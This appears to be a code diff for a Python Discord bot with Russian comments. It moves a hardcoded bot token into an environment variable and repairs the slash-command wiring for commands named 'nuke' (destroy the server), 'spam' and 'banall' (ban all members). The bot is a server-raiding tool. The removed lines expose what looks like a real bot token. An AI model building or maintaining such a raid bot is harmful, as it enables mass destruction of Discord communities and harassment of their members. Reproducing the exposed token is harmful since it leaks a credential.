@@ -3,6 +3,11 @@ from discord.ext import commands
 import asyncio
 import aiohttp
 import random
+import os
+from dotenv import load_dotenv
+
+# Загружаем переменные из .env файла
+load_dotenv()
 
 # Настройки бота
 intents = discord.Intents.all()
@@ -12,8 +17,8 @@ intents.members = True
 
 bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 
-# Токен бота (нужно заменить на ваш)
-TOKEN = "MTQxNTQyNTY3Mzk1MDAwMzI0MA.GPo2WZ.uL8IwQeyR9k5y19nqqJ4jDjmFTh4K0y6q6NFXw"
+# Токен бота из .env файла
+TOKEN = os.getenv('DISCORD_TOKEN')
 
 @bot.event
 async def on_ready():
@@ -120,30 +125,36 @@ async def help(ctx):
 @bot.tree.command(name="nuke", description="Уничтожение сервера")
 async def slash_nuke(interaction: discord.Interaction):
     await interaction.response.send_message("🚀 Запуск Nuke...")
-    await nuke(interaction)
+    ctx = await bot.get_context(interaction.message)
+    await nuke(ctx)
 
 @bot.tree.command(name="spam", description="Спам сообщениями")
 async def slash_spam(interaction: discord.Interaction, amount: int = 100):
     await interaction.response.send_message(f"📢 Спам {amount} сообщений...")
-    ctx = await bot.get_context(interaction)
+    ctx = await bot.get_context(interaction.message)
     await spam(ctx, amount)
 
 @bot.tree.command(name="banall", description="Бан всех участников")
 async def slash_banall(interaction: discord.Interaction):
     await interaction.response.send_message("🔨 Бан всех участников...")
-    ctx = await bot.get_context(interaction)
+    ctx = await bot.get_context(interaction.message)
     await banall(ctx)
 
 @bot.tree.command(name="help", description="Помощь по командам")
 async def slash_help(interaction: discord.Interaction):
-    ctx = await bot.get_context(interaction)
+    ctx = await bot.get_context(interaction.message)
     await help(ctx)
 
 # Запуск бота
 if __name__ == "__main__":
+    # Проверка токена
+    if not TOKEN:
+        print("ОШИБКА: Токен не найден! Создайте .env файл с DISCORD_TOKEN=ваш_токен")
+        exit(1)
+    
     # Синхронизация слэш команд
     @bot.event
     async def on_connect():
         await bot.tree.sync()
     
-    bot.run(MTQxNTQyNTY3Mzk1MDAwMzI0MA.GPo2WZ.uL8IwQeyR9k5y19nqqJ4jDjmFTh4K0y6q6NFXw)
+    bot.run(TOKEN)
